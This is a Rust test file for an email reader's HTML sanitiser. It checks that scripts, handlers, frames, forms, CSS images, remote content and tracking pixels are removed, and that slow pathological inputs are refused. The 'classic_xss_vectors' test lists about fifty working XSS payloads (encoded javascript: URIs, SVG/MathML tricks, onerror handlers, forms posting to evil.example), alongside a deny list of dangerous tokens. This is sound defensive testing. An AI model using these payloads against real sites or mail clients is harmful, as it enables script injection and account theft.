// This Source Code Form is subject to the terms of the Mozilla Public
// License, v. 2.0. If a copy of the MPL was not distributed with this
// file, You can obtain one at https://mozilla.org/MPL/2.0/.

//! The sanitiser against hostile HTML: what must go in both modes, what remote content changes,
//! and the classic XSS vectors (mixed case, entity-encoded `javascript:`, SVG and MathML, broken
//! tags, comments, namespace confusion).
#![allow(clippy::unwrap_used, clippy::expect_used)]

use std::collections::HashMap;

use croft_reader::{sanitize_html, Sanitized, BLOCKED_IMAGE_PLACEHOLDER};

fn clean(html: &str, remote_allowed: bool) -> Sanitized {
    sanitize_html(html, remote_allowed, &HashMap::new())
}

/// Everything a script, a frame, a form or a remote load could hide behind.
const NEVER: &[&str] = &[
    "<script",
    "javascript",
    "vbscript",
    "alert",
    "onerror",
    "onload",
    "onclick",
    "onmouseover",
    "onfocus",
    "<iframe",
    "<frame",
    "<object",
    "<embed",
    "<form",
    "<input",
    "<button",
    "<base",
    "<meta",
    "<link",
    "<style",
    "<svg",
    "<math",
    "<template",
    "<noscript",
    "url(",
    "expression",
    "evil.example",
    "data:text",
    "srcdoc",
    "formaction",
    "<!--",
];

fn assert_safe(out: &str, input: &str) {
    let lower = out.to_ascii_lowercase();
    for bad in NEVER {
        assert!(
            !lower.contains(bad),
            "{bad:?} survived\n  in:  {input}\n  out: {out}"
        );
    }
    // The only data: URI the core writes for remote content is the placeholder.
    for (i, _) in lower.match_indices("data:") {
        assert!(out[i..].starts_with(BLOCKED_IMAGE_PLACEHOLDER), "{out}");
    }
}

#[test]
fn script_iframe_handlers_pixels_css_images_and_remote_images_go_while_blocked() {
    let html = r#"<p onclick="alert(1)">Hi</p><script>alert(2)</script>
        <iframe src="https://evil.example/"></iframe>
        <img src="https://t.example/p.gif" width="1" height="1">
        <div style="background-image:url(https://evil.example/bg.png);color:red">styled</div>
        <img src="https://images.example/cat.jpg" alt="cat">"#;
    let out = clean(html, false);
    assert_safe(&out.html, html);
    assert_eq!(out.blocked_remote, 1);
    assert_eq!(out.trackers_removed, 1);
    assert_eq!(out.styles_removed, 1);
    assert!(out.html.contains("color:red"), "{}", out.html);
    assert!(out.html.contains(BLOCKED_IMAGE_PLACEHOLDER), "{}", out.html);
    assert!(out.html.contains(r#"alt="cat""#));
    assert!(!out.html.contains("images.example"));
}

#[test]
fn with_remote_content_allowed_only_the_image_comes_back() {
    let html = r#"<p onclick="alert(1)">Hi</p><script>alert(2)</script>
        <iframe src="https://evil.example/"></iframe>
        <img src="https://t.example/p.gif" width="1" height="1">
        <div style="background-image:url(https://evil.example/bg.png);color:red">styled</div>
        <img src="https://images.example/cat.jpg" alt="cat"
             srcset="https://images.example/cat2.jpg 2x, http://images.example/cat3.jpg 3x">"#;
    let out = clean(html, true);
    assert_safe(&out.html, html);
    assert_eq!(out.blocked_remote, 0);
    assert_eq!(out.trackers_removed, 1, "pixels go in every mode");
    assert_eq!(out.styles_removed, 1, "CSS images go in every mode");
    assert!(
        out.html.contains(r#"src="https://images.example/cat.jpg""#),
        "{}",
        out.html
    );
    assert!(
        out.html.contains("https://images.example/cat3.jpg 3x"),
        "{}",
        out.html
    );
    assert!(!out.html.contains("t.example"));
}

#[test]
fn classic_xss_vectors_never_survive() {
    let vectors = [
        "<ScRiPt>alert(1)</sCrIpT>",
        "<SCRIPT SRC=https://evil.example/x.js></SCRIPT>",
        r#"<a href="javascript:alert(1)">x</a>"#,
        r#"<a href="JaVaScRiPt:alert(1)">x</a>"#,
        r#"<a href="jav&#x61;script:alert(1)">x</a>"#,
        r#"<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">x</a>"#,
        r#"<a href="  javascript:alert(1)">x</a>"#,
        "<a href=\"java\tscript:alert(1)\">x</a>",
        "<a href=\"java\nscript:alert(1)\">x</a>",
        r#"<a href="vbscript:msgbox(1)">x</a>"#,
        r#"<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>"#,
        r#"<img src="data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=">"#,
        r#"<img src=x onerror=alert(1)>"#,
        r#"<img src="x" onerror="alert(1)""#,
        r#"<img """><script>alert(1)</script>">"#,
        r#"<img src=`x` onerror=alert(1)>"#,
        r#"<IMG SRC="jav&#x09;ascript:alert(1);">"#,
        "<svg onload=alert(1)>",
        "<svg><script>alert(1)</script></svg>",
        r#"<svg><a xlink:href="javascript:alert(1)"><text>x</text></a></svg>"#,
        "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>",
        r#"<math><mi xlink:href="javascript:alert(1)">x</mi></math>"#,
        r#"<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>"#,
        r#"<!--<img src=x onerror=alert(1)>-->"#,
        r#"<!--[if gte IE 4]><script>alert(1)</script><![endif]-->"#,
        r#"<body onload=alert(1)>"#,
        r#"<div onmouseover="alert(1)">x</div>"#,
        r#"<input onfocus=alert(1) autofocus>"#,
        r#"<form action="https://evil.example/"><input name="pw"><button formaction="javascript:alert(1)">go</button></form>"#,
        r#"<iframe srcdoc="<script>alert(1)</script>"></iframe>"#,
        r#"<object data="https://evil.example/x.swf"></object>"#,
        r#"<embed src="https://evil.example/x.swf">"#,
        r#"<base href="https://evil.example/">"#,
        r#"<meta http-equiv="refresh" content="0;url=https://evil.example/">"#,
        r#"<link rel="stylesheet" href="https://evil.example/x.css">"#,
        r#"<style>@import url(https://evil.example/x.css);</style>"#,
        r#"<div style="background:url(javascript:alert(1))">x</div>"#,
        r#"<div style="width: expression(alert(1))">x</div>"#,
        r#"<div style="behavior: url(https://evil.example/x.htc)">x</div>"#,
        r#"<div style="background:\75 rl(https://evil.example/x)">x</div>"#,
        r#"<table background="https://evil.example/x.png"><tr><td>x</td></tr></table>"#,
        r#"<a href="https://ok.example/" ping="https://evil.example/ping">x</a>"#,
        r#"<video poster="https://evil.example/p.png"></video>"#,
        r#"<template><img src=x onerror=alert(1)></template>"#,
        r#"<textarea><img src=x onerror=alert(1)></textarea>"#,
        r#"<title><img src=x onerror=alert(1)></title>"#,
        r#"<x onclick=alert(1)>x</x>"#,
        r#"</p><p onclick=alert(1)>"#,
        "<<script>alert(1)//<</script>",
        r#"<a href="https://ok.example/" target="_blank" rel="opener">x</a>"#,
    ];
    for v in vectors {
        for allowed in [false, true] {
            let out = clean(v, allowed);
            assert_safe(&out.html, v);
        }
    }
}

#[test]
fn links_keep_their_real_destination_and_never_open_the_opener() {
    let out = clean(
        r#"<a href="https://shop.example/order?id=1&amp;x=2" target="_blank" rel="opener">Order</a>
           <a href="mailto:help@example.org">Mail</a><a href="/relative">Rel</a>"#,
        false,
    );
    assert!(
        out.html
            .contains(r#"<a href="https://shop.example/order?id=1&amp;x=2" rel="noopener noreferrer">Order</a>"#),
        "{}",
        out.html
    );
    assert!(out.html.contains(r#"href="mailto:help@example.org""#));
    assert!(!out.html.contains("/relative"), "{}", out.html);
    assert!(!out.html.contains("target"));
    assert!(!out.html.contains("opener\""));
}

#[test]
fn tables_fonts_and_safe_styles_survive_for_real_newsletters() {
    let html = r##"<table width="600" cellpadding="0" bgcolor="#ffffff"><tr>
        <td align="center" style="font-family: Arial, sans-serif; font-size: 14px; padding: 8px; position: absolute">
        <font color="#333333" face="Arial">Hello</font></td></tr></table>"##;
    let out = clean(html, false);
    assert!(out.html.contains(r#"width="600""#), "{}", out.html);
    assert!(out.html.contains(r##"bgcolor="#ffffff""##));
    assert!(out.html.contains("font-size:14px"), "{}", out.html);
    assert!(!out.html.contains("position"), "{}", out.html);
    assert!(out
        .html
        .contains(r##"<font color="#333333" face="Arial">"##));
}

#[test]
fn a_deep_or_huge_document_is_refused_quickly_instead_of_parsed() {
    // Parsing time grows with the square of the depth: 100 000 nested elements would take
    // minutes on a phone. Past the limits the HTML is not rendered at all (the screen shows text).
    let start = std::time::Instant::now();
    let deep = "<div>".repeat(100_000) + "x" + &"</div>".repeat(100_000);
    let out = clean(&deep, false);
    assert!(out.too_complex && out.html.is_empty());
    let wide = "<br>".repeat(croft_reader::sanitize::MAX_HTML_TAGS + 1);
    assert!(clean(&wide, false).too_complex);
    assert!(start.elapsed() < std::time::Duration::from_secs(30));
    // Just inside the limits it renders.
    let ok = "<div>".repeat(croft_reader::sanitize::MAX_HTML_DEPTH) + "x";
    let out = clean(&ok, false);
    assert!(!out.too_complex && out.html.contains('x'));
}

#[test]
fn the_slow_inputs_from_the_review_are_refused_before_any_parser_runs() {
    // H1 and H2: each took 35-60 s in html5ever (release build). The byte scan refuses them
    // (it can only over-count), so they never reach the parser.
    let attributes: String = (0..200_000).map(|n| format!(" a{n}")).collect();
    let inputs = [
        "<div/>".repeat(100_000),
        format!("<svg><plaintext></svg>{}", "<div>".repeat(110_000)),
        "<div></x>".repeat(20_000),
        format!("<p{attributes}>"),
        // Tags hidden inside one long quoted value.
        format!("<a b=\"{}\">", "<x c ".repeat(200_000)),
    ];
    let start = std::time::Instant::now();
    for html in &inputs {
        let out = clean(html, false);
        assert!(
            out.too_complex && out.html.is_empty(),
            "{} bytes",
            html.len()
        );
    }
    // Generous even for a debug build: the decision is a linear byte scan.
    assert!(start.elapsed() < std::time::Duration::from_secs(20));
}

#[test]
fn deep_legacy_layouts_and_long_newsletters_still_render() {
    // Unclosed <td>, <tr>, <p> and <font> in 300 nested layout rows (depth about 1200 as counted).
    let mut legacy = String::from("<table width=600>");
    for r in 0..300 {
        legacy.push_str(&format!(
            "<tr><td valign=top><font face=Arial size=2><p>Item {r}<br>Price<p>More</font>\
             <td><table><tr><td><img src=https://x.example/{r}.gif width=100 height=100>\
             <td>caption {r}</table>"
        ));
    }
    legacy.push_str("</table>");
    let out = clean(&legacy, false);
    assert!(!out.too_complex);
    assert_eq!(out.blocked_remote, 300);
    // 2000 Outlook paragraphs.
    let outlook =
        "<p class=MsoNormal><span style='font-size:11.0pt'>Line<o:p></o:p></span></p>".repeat(2000);
    assert!(!clean(&outlook, false).too_complex);
}

#[test]
fn one_inline_image_referenced_many_times_cannot_grow_the_html_without_bound() {
    // H4: a 1 MiB image referenced 40 times used to be written 40 times.
    let mut data = b"\x89PNG\r\n\x1a\n".to_vec();
    data.resize(1024 * 1024, 7);
    let images = HashMap::from([(
        "a".to_owned(),
        croft_reader::InlineImage {
            mime_type: "image/png".into(),
            data,
        },
    )]);
    let html = "<img src=\"cid:a\">".repeat(40);
    let out = sanitize_html(&html, false, &images);
    assert!(
        out.html.len() <= croft_reader::sanitize::MAX_INLINE_DATA_BYTES + 64 * 1024,
        "{} bytes",
        out.html.len()
    );
    assert!(out.html.contains("data:image/png;base64,"));
    assert!(
        out.html.contains(BLOCKED_IMAGE_PLACEHOLDER),
        "past the budget: placeholders"
    );
    assert_eq!(out.cids_used, ["a"]);
}

#[test]
fn tracking_pixels_are_found_on_the_tree_the_renderer_gets() {
    // M1: each of these hid a pixel from the old tokenizer pass (foreign content, odd spelling,
    // srcset only). Remote content allowed: only a pixel could still load.
    let pixel = r#"src="https://t.example/a" width=1 height=1"#;
    let cases = [
        format!("<svg><style><img {pixel}></style></svg>"),
        format!("<svg><textarea><img {pixel}></textarea></svg>"),
        format!("<svg><script><img {pixel}></script></svg>"),
        format!("<math><xmp><img {pixel}></xmp></math>"),
        format!("<svg><plaintext></svg><img {pixel}>"),
        r#"<img srcset="https://t.example/a 1x" width="1">"#.to_owned(),
        r#"<img src="https://img.example/x.png" srcset="https://t.example/open.gif 2x">"#
            .to_owned(),
        r#"<img src="https://t.example/a" style="width/**/:1px">"#.to_owned(),
        r#"<img src="https://t.example/a" style="width:0.01em;height:0.01em">"#.to_owned(),
        r#"<img src="https://t.example/a" width="0%">"#.to_owned(),
        r#"<img src="https://t.example/a" style="opacity:0">"#.to_owned(),
        r#"<img src="https://t.example/a" style="display : none">"#.to_owned(),
    ];
    for html in &cases {
        let out = clean(html, true);
        assert!(!out.html.contains("t.example"), "{html}\n -> {}", out.html);
        assert!(
            !out.html.contains("img.example"),
            "{html}\n -> {}",
            out.html
        );
        assert_eq!(out.trackers_removed, 1, "{html}\n -> {}", out.html);
        assert_eq!(out.blocked_remote, 0, "{html}");
    }
    // A real image next to a pixel keeps its src and srcset (http upgraded).
    let out = clean(
        r#"<img src="https://img.example/a.png" srcset="http://img.example/b.png 2x" width="600"><img src="https://t.example/p" width=1>"#,
        true,
    );
    assert!(
        out.html.contains(r#"src="https://img.example/a.png""#),
        "{}",
        out.html
    );
    assert!(
        out.html
            .contains(r#"srcset="https://img.example/b.png 2x""#),
        "{}",
        out.html
    );
    assert_eq!(out.trackers_removed, 1);
    // Blocked: one count per image, srcset-only images included.
    let out = clean(
        r#"<img src="https://img.example/a.png" srcset="https://img.example/b.png 2x"><img srcset="https://img.example/c.png 1x">"#,
        false,
    );
    assert_eq!(out.blocked_remote, 2, "{}", out.html);
    assert!(!out.html.contains("img.example"));
}
